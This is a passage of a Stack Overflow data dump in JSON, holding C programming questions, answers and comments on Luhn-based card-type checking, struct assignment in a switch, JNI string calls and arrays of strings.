sum_b + digit ;\n        }\n\n        return sum_a ;\n        return sum_b ;\n        return count ;\n    }\n\n    // Checking the validity of the number according to Luhn's algorithm\n\n    int total_sum = sum_a + sum_b ;\n\n    if (total_sum % 10 != 0)\n    {\n       printf(\"This is an invalid number.\\n\") ; \n    }\n\n// If the number entered doesn't have the right amount of digits according\n// to variable 'count', declare the number as invalid.\n\n    if (count != 13 || count != 15 || count != 16)\n    {\n        printf(\"This is an invalid number.\\n\") ;\n    }\n\n// Reset value of variable 'temp_num' and apply calculations that will isolate the first two digits. \n// Store the results in a variable 'company_id'.\n\n    temp_num = card_num ;\n    int company_id ;\n\n    while (temp_num &gt; 100)\n    {\n        temp_num = card_num - (card_num % 10) ;\n        company_id = temp_num / 10 ;\n    }\n\n    return company_id ;\n\n// Print the type of credit card depending on the company ID and amount of digits.\n\n    if (company_id &gt; 50 &amp;&amp; company_id &lt; 56 &amp;&amp; count == 16)\n    {\n        printf(\"MASTERCARD\\n\") ;\n    }\n    else if ((company_id == 4) &amp;&amp; (count == 13 || count == 16))\n    {\n        printf(\"VISA\\n\") ;\n    }\n    else if ((company_id == 34 || company_id == 37) &amp;&amp; (count == 15)) \n    {\n        printf(\"AMEX\\n\") ;\n    }\n    else\n    {\n        printf(\"This is an invalid number.\\n\") ;\n    }\n\n    return 0 ;\n\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "switch-statement"], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1476297421, "creation_date": 1476297421, "answer_id": 40005994, "question_id": 40005959, "link": "https://stackoverflow.com/questions/40005959/c-initialize-struct-in-switch-case/40005994#40005994", "title": "C initialize struct in switch case", "body": "<p>What you're doing is assignment, not initialization.  Initialization can only be performed at the time the variable is defined.  Curly braces may be used to initialize a variable, but not to assign. </p>\n\n<p>You'll need to assign each member of the struct individually.</p>\n"}, {"comments": [{"owner": {"reputation": 1215, "user_id": 5292630, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-9xh1qblC2Uk/AAAAAAAAAAI/AAAAAAAAAKM/GTBB97nnbYA/photo.jpg?sz=128", "display_name": "Heman Gandhi", "link": "https://stackoverflow.com/users/5292630/heman-gandhi"}, "edited": false, "score": 0, "creation_date": 1476297601, "post_id": 40006005, "comment_id": 67289985, "body": "Thanks. Unfortunately, I have to work with C89. No convenience for me... :("}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "reply_to_user": {"reputation": 1215, "user_id": 5292630, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-9xh1qblC2Uk/AAAAAAAAAAI/AAAAAAAAAKM/GTBB97nnbYA/photo.jpg?sz=128", "display_name": "Heman Gandhi", "link": "https://stackoverflow.com/users/5292630/heman-gandhi"}, "edited": false, "score": 0, "creation_date": 1476297671, "post_id": 40006005, "comment_id": 67290030, "body": "@HermanGhandi OK, that&#39;s unfortunate, but, if I may ask, why do you need to use C89? It&#39;s totally obsolete."}, {"owner": {"reputation": 1215, "user_id": 5292630, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-9xh1qblC2Uk/AAAAAAAAAAI/AAAAAAAAAKM/GTBB97nnbYA/photo.jpg?sz=128", "display_name": "Heman Gandhi", "link": "https://stackoverflow.com/users/5292630/heman-gandhi"}, "edited": false, "score": 0, "creation_date": 1476297950, "post_id": 40006005, "comment_id": 67290185, "body": "The university computers are like that. They can compile C99, but with flags that the graders may not use or like."}], "tags": [], "owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "is_accepted": false, "score": 3, "last_activity_date": 1476297607, "last_edit_date": 1476297607, "creation_date": 1476297454, "answer_id": 40006005, "question_id": 40005959, "link": "https://stackoverflow.com/questions/40005959/c-initialize-struct-in-switch-case/40006005#40006005", "title": "C initialize struct in switch case", "body": "<p>Use <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Compound-Literals.html#Compound-Literals\" rel=\"nofollow\">compound literals</a>:</p>\n\n<pre><code>t = (mystruct) { ... };\n</code></pre>\n\n<p>This is supported by C99+, but supported as an extension by GCC for C90.</p>\n"}], "owner": {"reputation": 1215, "user_id": 5292630, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-9xh1qblC2Uk/AAAAAAAAAAI/AAAAAAAAAKM/GTBB97nnbYA/photo.jpg?sz=128", "display_name": "Heman Gandhi", "link": "https://stackoverflow.com/users/5292630/heman-gandhi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 389, "favorite_count": 0, "accepted_answer_id": 40005994, "answer_count": 2, "score": 1, "last_activity_date": 1476297607, "creation_date": 1476297301, "question_id": 40005959, "link": "https://stackoverflow.com/questions/40005959/c-initialize-struct-in-switch-case", "title": "C initialize struct in switch case", "body": "<p>So I have the following \"shape\" in my code:</p>\n\n<pre><code>mystruct t;\nswitch(something){\n    case THIS:\n        t = {/*initialization*/};\n        break;\n    case THAT:\n        t = {/*initialization*/};\n        break;           \n    case AND_THE_OTHER:\n        t = {/*initialization*/};\n        break;\n}\n</code></pre>\n\n<p><code>gcc</code> insists that there should be an expression before the <code>{</code>:</p>\n\n<pre><code>error: expected expression before '{' token\n    t = {\n        ^\n</code></pre>\n\n<p>Why? What does <code>gcc</code> think I'm up to? What's the clean way to do this?</p>\n"}, {"tags": ["c", "string", "java-native-interface"], "comments": [{"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1476362916, "post_id": 40005820, "comment_id": 67319593, "body": "This example is strange to say the least. Why go through a native method to call <code>Employee.getAge()</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 1470, "user_id": 6620333, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/4eb000d274caa34e6db0ff8e77a6a677?s=128&d=identicon&r=PG&f=1", "display_name": "mafioso", "link": "https://stackoverflow.com/users/6620333/mafioso"}, "edited": false, "score": 0, "creation_date": 1476305248, "post_id": 40006006, "comment_id": 67294132, "body": "I just have a jobject as a parameter and want to get a string of it. That can&#39;t be so difficult for <code>String</code> if it&#39;s so easy for <code>int</code>"}, {"owner": {"reputation": 803, "user_id": 5531385, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-wpokHCJQEJ4/AAAAAAAAAAI/AAAAAAAAEZU/ih9fDr0oG-Q/photo.jpg?sz=128", "display_name": "Victor Havin", "link": "https://stackoverflow.com/users/5531385/victor-havin"}, "reply_to_user": {"reputation": 1470, "user_id": 6620333, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/4eb000d274caa34e6db0ff8e77a6a677?s=128&d=identicon&r=PG&f=1", "display_name": "mafioso", "link": "https://stackoverflow.com/users/6620333/mafioso"}, "edited": false, "score": 0, "creation_date": 1476312429, "post_id": 40006006, "comment_id": 67297276, "body": "You see, int is a primitive type returned by value - so it is easy to handle. Strings are allocated on the GC heap and they have to be properly disposed. Otherwise the memory will leak. If you remove the memory handling code from this sample, it will be not much different from the int case. Besides, if you decided to venture into the JNI area, you can&#39;t complain about the complexity."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1476362676, "post_id": 40006006, "comment_id": 67319399, "body": "Luckily, JNI provides a special wrapper for java.lang.String"}, {"owner": {"reputation": 803, "user_id": 5531385, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-wpokHCJQEJ4/AAAAAAAAAAI/AAAAAAAAEZU/ih9fDr0oG-Q/photo.jpg?sz=128", "display_name": "Victor Havin", "link": "https://stackoverflow.com/users/5531385/victor-havin"}, "edited": false, "score": 0, "creation_date": 1476377076, "post_id": 40006006, "comment_id": 67330570, "body": "JNI does not. At least not that I know about. However, there are several C++ libraries out there that do. For example, this one: <a href=\"https://github.com/mapbox/jni.hpp\" rel=\"nofollow noreferrer\">github.com/mapbox/jni.hpp</a>"}], "tags": [], "owner": {"reputation": 803, "user_id": 5531385, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-wpokHCJQEJ4/AAAAAAAAAAI/AAAAAAAAEZU/ih9fDr0oG-Q/photo.jpg?sz=128", "display_name": "Victor Havin", "link": "https://stackoverflow.com/users/5531385/victor-havin"}, "is_accepted": false, "score": 0, "last_activity_date": 1476297455, "creation_date": 1476297455, "answer_id": 40006006, "question_id": 40005820, "link": "https://stackoverflow.com/questions/40005820/how-to-call-java-method-which-returns-string-from-c-using-jni/40006006#40006006", "title": "How to call Java method which returns String from C using JNI?", "body": "<p>Below is an example of JNI code calling a method returning a string. Hope this helps.</p>\n\n<pre><code>int EXT_REF Java_JNITest_CallJava(\n    JNIEnv* i_pjenv, \n    jobject i_jobject\n)\n{\n    jclass      jcSystem;\n    jmethodID   jmidGetProperty;\n    LPWSTR      wszPropName = L\"java.version\";\n\n    jcSystem = i_pjenv-&gt;FindClass(\"java/lang/System\");\n    if(NULL == jcSystem)\n    {\n        return -1;\n    }\n    jmidGetProperty = i_pjenv-&gt;GetStaticMethodID(jcSystem,\n                      \"getProperty\", \"(Ljava/lang/String;)Ljava/lang/String;\");\n    if(NULL == jmidGetProperty)\n    {\n        return -1;\n    }\n\n    jstring joStringPropName = i_pjenv-&gt;NewString((const jchar*)wszPropName, wcslen(wszPropName));\n    jstring joStringPropVal  = (jstring)i_pjenv-&gt;CallStaticObjectMethod(jcSystem, \n                               jmidGetProperty, (jstring)joStringPropName);\n    const jchar* jcVal = i_pjenv-&gt;GetStringChars(joStringPropVal, JNI_FALSE);\n    printf(\"%ws = %ws\\n\", wszPropName, jcVal);\n    i_pjenv-&gt;ReleaseStringChars(joStringPropVal, jcVal);\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "is_accepted": false, "score": 0, "last_activity_date": 1476363325, "creation_date": 1476363325, "answer_id": 40021637, "question_id": 40005820, "link": "https://stackoverflow.com/questions/40005820/how-to-call-java-method-which-returns-string-from-c-using-jni/40021637#40021637", "title": "How to call Java method which returns String from C using JNI?", "body": "<p>in Java, define the native method</p>\n\n<pre><code>public class Client {\n    public static native getVorname(int employeeNumber);\n}\n</code></pre>\n\n<p>and here is the C side:</p>\n\n<pre><code>Employee employees[100];\n\nJNIEXPORT jstring JNICALL Java_Client_getVorname(JNIEnv *env, jclass clientClass, jint employeeNumber) {\n    if (employeeNumber &lt; 0 || employeeNumber &gt; 100) {\n        return NULL;\n    }\n    Employee* ptr = employees[employeeNumber];\n    return (*env)-&gt;NewStringUTF(env, ptr-&gt;vorname);\n}\n</code></pre>\n"}], "owner": {"reputation": 1470, "user_id": 6620333, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/4eb000d274caa34e6db0ff8e77a6a677?s=128&d=identicon&r=PG&f=1", "display_name": "mafioso", "link": "https://stackoverflow.com/users/6620333/mafioso"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 864, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1476363325, "creation_date": 1476296797, "last_edit_date": 1476298306, "question_id": 40005820, "link": "https://stackoverflow.com/questions/40005820/how-to-call-java-method-which-returns-string-from-c-using-jni", "title": "How to call Java method which returns String from C using JNI?", "body": "<p>Is there a way to call a java method, which returns a <code>String</code> in C?<br>\nFor <code>Integer</code> it works like that:  </p>\n\n<pre><code>JNIEXPORT jint JNICALL Java_Client_getAgeC(JNIEnv *env, jobject callingObject, jobject employeeObject) {\njclass employeeClass = (*env)-&gt;GetObjectClass(env, employeeObject);\njmethodID midGetAge = (*env)-&gt;GetMethodID(env, employeeClass, \"getAge\", \"()I\");\nint age =  (*env)-&gt;CallIntMethod(env, employeeObject, midGetAge);\nreturn age;\n}\n</code></pre>\n\n<p>I've searched for a long time but nothing works for <code>String</code>.\nFinally, I want to get a <code>char*</code><br>\nThanks in advance!</p>\n"}, {"tags": ["c", "multidimensional-array"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1476296838, "post_id": 40005745, "comment_id": 67289542, "body": "C does not have string objects like other languages. It has <a href=\"https://en.wikipedia.org/wiki/C_string_handling\" rel=\"nofollow noreferrer\">string manipulation functions</a>, but the string itself is just an array of characters with a nul terminator at the end."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476297276, "post_id": 40005745, "comment_id": 67289784, "body": "Step by step. Forget processing each string for now - focus on reading them into the array and then printing. Next step, make a simple change to each, and print. And so on. And please don&#39;t overlook <code>fgets()</code>. It can be simpler processing each string <i>after</i> it has been read."}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1476297322, "post_id": 40005745, "comment_id": 67289807, "body": "<code>char arr[100][100];</code> is a 2D array of <code>char</code>s, single characters, not strings, but one row of it, like <code>arr[i]</code>, if null terminated, can be printed as a string with <code>printf(&quot;%s\\n&quot;, arr[i]);</code> or inputted with scanf or better fgets."}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476297449, "post_id": 40005981, "comment_id": 67289904, "body": "Qualify &quot;In C, a string is simply an array of characters&quot;. No, what makes that array a string in C is the <code>&#39;\\0&#39;</code> terminator."}], "tags": [], "owner": {"reputation": 1716, "user_id": 190164, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/ec8f4af4362c75937ca248f5a74e67c0?s=128&d=identicon&r=PG", "display_name": "zacaj", "link": "https://stackoverflow.com/users/190164/zacaj"}, "is_accepted": false, "score": 1, "last_activity_date": 1476299562, "last_edit_date": 1476299562, "creation_date": 1476297362, "answer_id": 40005981, "question_id": 40005745, "link": "https://stackoverflow.com/questions/40005745/what-is-the-proper-way-to-populate-an-array-of-strings-in-c-such-that-each-stri/40005981#40005981", "title": "What is the proper way to populate an array of Strings in C, such that each string is a single element in the array", "body": "<p>comment is a 2D array of chars, which are single characters.  In C, a string is simply an array of characters, so your definition of comment is one way to define a 1D array of strings.</p>\n\n<p>As far as the loading goes, the only obvious potential problem is that you don't ever reset startComment to zero (but you should use a debugger to make sure it's being loaded correctly), however your code to print it out is wrong.  </p>\n\n<p>Using printf() with a %s tells it to start printing the string at whatever address you give it, but you're giving it individual characters, not whole strings, so it's interpreting each character in each string (because C is a horrible, horrible language) as an address in RAM and trying to print that RAM.  To print an individual character, use %c instead of %s.  Or, just make a 1D for loop:</p>\n\n<pre><code>for(int x=0; x&lt;MAX_LENGTH; X++)\n    printf(\"%s\\n\", comment[x])   \n</code></pre>\n\n<p>It's also a bit confusing that you use the same MAX_LENGTH for the number of lines in the array and the length of the string in each line</p>\n"}, {"comments": [{"owner": {"reputation": 1716, "user_id": 190164, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/ec8f4af4362c75937ca248f5a74e67c0?s=128&d=identicon&r=PG", "display_name": "zacaj", "link": "https://stackoverflow.com/users/190164/zacaj"}, "edited": false, "score": 0, "creation_date": 1476298410, "post_id": 40006221, "comment_id": 67290479, "body": "it might be helpful to use a typedef to separate the &#39;string&#39; part of the 3D char array type from the array part"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1476298748, "post_id": 40006221, "comment_id": 67290671, "body": "You forgot to mention that in C strings are zero-terminated. So <code>char my_string[] = &quot;Hello&quot;;</code> will generate an array of length 6, not 5."}, {"owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "edited": false, "score": 0, "creation_date": 1476298772, "post_id": 40006221, "comment_id": 67290690, "body": "Easier - yes, helpful - not in my opinion. I think it goes against the philosophy of C to hide implementation details that way. It can easily lead to awkwardness with EG: <code>typedef char string[MAX_STRING_SIZE]; string a = &quot;test&quot;; string b = &quot;test2&quot;; a = b;</code> you expect that would actually work because a seems to have a primitive type, but that is not the case. This is the same reason why it is unwise to do <code>typedef struct { ... } mystruct;</code>."}, {"owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "edited": false, "score": 0, "creation_date": 1476298848, "post_id": 40006221, "comment_id": 67290743, "body": "C strings are not zero-terminated if you don&#39;t want them to be, I made that clear. As such <code>char my_string[5] = &quot;Hello&quot;;</code> is completely valid and just won&#39;t have the null terminator on the end. There is no rule against this at all. C merely &#39;plays nicely&#39; with null-terminated strings. Unlike other languages it doesn&#39;t forbid much at all, including how you want to use strings."}, {"owner": {"reputation": 1716, "user_id": 190164, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/ec8f4af4362c75937ca248f5a74e67c0?s=128&d=identicon&r=PG", "display_name": "zacaj", "link": "https://stackoverflow.com/users/190164/zacaj"}, "edited": false, "score": 1, "creation_date": 1476299010, "post_id": 40006221, "comment_id": 67290823, "body": "&quot;Hello&quot; is a six element constant; that example doesn&#39;t compile (at least in MSVC)"}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 1, "creation_date": 1476299019, "post_id": 40006221, "comment_id": 67290828, "body": "If they are not zero terminated, they are plain char arrays, not &quot;strings&quot;."}, {"owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "reply_to_user": {"reputation": 1716, "user_id": 190164, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/ec8f4af4362c75937ca248f5a74e67c0?s=128&d=identicon&r=PG", "display_name": "zacaj", "link": "https://stackoverflow.com/users/190164/zacaj"}, "edited": false, "score": 0, "creation_date": 1476299571, "post_id": 40006221, "comment_id": 67291135, "body": "@zacaj right you are, I forgot that that is an extension (I used it once, forgot how I got it working, probably some esoteric gcc extension)."}, {"owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "reply_to_user": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 1, "creation_date": 1476299576, "post_id": 40006221, "comment_id": 67291137, "body": "@Bob__ A string is any representation of text. If you store strings via ints with ascii values, good for you, still a string, just not a &quot;c-string&quot; which is indeed null terminated (because of the way c default its initialization)."}], "tags": [], "owner": {"reputation": 1209, "user_id": 4217072, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh4.googleusercontent.com/-d9p4Q8FtKsk/AAAAAAAAAAI/AAAAAAAAAC4/5Kn4PPeQKSI/photo.jpg?sz=128", "display_name": "LambdaBeta", "link": "https://stackoverflow.com/users/4217072/lambdabeta"}, "is_accepted": true, "score": 1, "last_activity_date": 1476298253, "creation_date": 1476298253, "answer_id": 40006221, "question_id": 40005745, "link": "https://stackoverflow.com/questions/40005745/what-is-the-proper-way-to-populate-an-array-of-strings-in-c-such-that-each-stri/40006221#40006221", "title": "What is the proper way to populate an array of Strings in C, such that each string is a single element in the array", "body": "<p>The problem you are having is that C was designed to be essentially a glorified assembler. That means that the only stuff it has 'built-in' are things for which there is an obvious correct way to do it. Strings do <strong>not</strong> meet this criteria. As such strings are not a first-order citizen in c.</p>\n\n<p>In particular there are at least three viable ways to deal with strings, C doesn't force you to use any of them, but instead allows you to use what you want for the job at hand.</p>\n\n<h1>Method 1: Static Array</h1>\n\n<p>This method appears to be similar to what you are trying to do, and is often used by new C programmers. In this method a string is just an array of characters exactly long enough to fit its contents. Assigning arrays becomes difficult, so this promotes using strings as immutables. It feels likely that this is how most JVM's would implement strings. C code: <code>char my_string[] = \"Hello\";</code></p>\n\n<h1>Method 2: Static Bounded Array</h1>\n\n<p>This method is what you are doing. You decide that your strings must be shorter than a specified length, and pre-allocate a large enough buffer for them. In this case it is relatively easy to assign strings and change them, but they must not become longer than the set length. C code: <code>char my_string[MAX_STRING_LENGTH] = \"Hello\";</code></p>\n\n<h1>Method 3: Dynamic Array</h1>\n\n<p>This is the most advanced and risky method. Here you dynamically allocate your strings so that they always fit their content. If they grow too big, you resize. They can be implemented many ways (usually as a single char pointer that is realloc'd as necessary in combination with method 2, occasionally as a linked list). </p>\n\n<p>Regardless of how you implement strings, to C's eyes they are all just arrays of characters. The only caveat is that to use the standard library you need to null terminate your strings manually (although many [all?] of them specify ways to get around this by manually specifying the length).</p>\n\n<p>This is why java strings are not primitive types, but rather objects of type <code>String</code>. </p>\n\n<p>Interestingly enough, many languages actually use different String types for these solutions. For example Ada has <code>String</code>, <code>Bounded_String</code>, and <code>Unbounded_String</code> for the three methods above.</p>\n\n<h1>Solution</h1>\n\n<p>Look at your code again: <code>char arr[100][100];</code> which method is this, and what is it?</p>\n\n<p>Obviously it is method 2 with <code>MAX_STRING_LENGTH</code> of 100. So you could pretend the line says: <code>my_strings arr[100]</code> which makes your issue apparent, this is not a 2D array of strings, but a 2D array of characters which represents a 1D array of strings. To create a 2D array of strings in C you would use: <code>char arr[WIDTH][HEIGHT][MAX_STRING_LENGTH]</code> which is easy to get wrong. As above, however, you have some logic errors in your code, and you can probably solve this problem with just a 1D array of strings. (2D array of chars)</p>\n"}], "owner": {"reputation": 920, "user_id": 6069557, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/wZ3e5.png?s=128&g=1", "display_name": "Elroy Jetson", "link": "https://stackoverflow.com/users/6069557/elroy-jetson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1854, "favorite_count": 0, "accepted_answer_id": 40006221, "answer_count": 2, "score": 2, "last_activity_date": 1476304247, "creation_date": 1476296533, "last_edit_date": 1476304247, "question_id": 40005745, "link": "https://stackoverflow.com/questions/40005745/what-is-the-proper-way-to-populate-an-array-of-strings-in-c-such-that-each-stri", "title": "What is the proper way to populate an array of Strings in C, such that each string is a single element in the array", "body": "<p>I'm trying to initialize a 2D array of strings in C; which does not seem to work like any other language I've coded in. What I'm TRYING to do, is read input, and take all of the comments out of that input and store them in a 2d array, where each string would be a new row in the array. When I get to a character that is next line, I want to advance the first index of the array so that I can separate each \"comment string\". ie. </p>\n\n<pre><code>   char arr[100][100];\n\n   &lt;whatever condition&gt;\n   arr[i][j] = \"//First comment\";\n</code></pre>\n\n<p>Then when I get to a '/n' I want to increment the first index such that:</p>\n\n<pre><code>   arr[i+1][j] = \"//Second comment\";\n</code></pre>\n\n<p>I just want to be able to access each input as an individual element in my array. In Java I wouldn't need to do this, as each string would already be an individual element in a String array. I've only been working with c for 3 weeks now, and things that I used to take for granted as being simple, have proven to be quite frustrating in C.</p>\n\n<p>My actual code is below. It gives me an infinite loop and prints out a ton of numbers:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nconst int MAXLENGTH = 500;\n\nint main(){\n    char comment[MAXLENGTH][MAXLENGTH];\n    char activeChar;\n    int cIndex = 0;\n    int startComment = 0;\n    int next = 0;\n\n    while((activeChar = getchar()) != EOF){\n        if(activeChar == '/'){\n            startComment = 1;\n        }\n\n        if(activeChar == '\\n'){\n            comment[next][cIndex] = '\\0';\n            next++;\n        }\n\n        if(startComment){\n            comment[next][cIndex] = activeChar;\n            cIndex++;\n        }\n    }\n\n    for(int x = 0 ; x &lt;  MAXLENGTH; x++){\n        for (int j = 0; j &lt; MAXLENGTH; j++){\n            if(comment[x][j] != 0)\n            printf(\"%s\", comment[x][j]); \n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 4, "creation_date": 1476294084, "post_id": 40004998, "comment_id": 67287911, "body": "Your compiler did <i>not</i> warn you about <code>&#39;99&#39;</code> not being a standard character? If not, seriously turn up your warning levels."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1476294146, "post_id": 40004998, "comment_id": 67287938, "body": "how about <code>strcpy(ptr, &quot;99&quot;);</code> which would also put a null char after the two 9s"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1476294148, "post_id": 40004998, "comment_id": 67287942, "body": "why not use <code>int* ptr</code>"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1476294150, "post_id": 40004998, "comment_id": 67287946, "body": "<code>*ptr = &#39;9&#39;; *(ptr+1) = &#39;9&#39;;</code>"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1476294154, "post_id": 40004998, "comment_id": 67287948, "body": "@WhozCraig I&#39;ve never had such code even compile before"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, 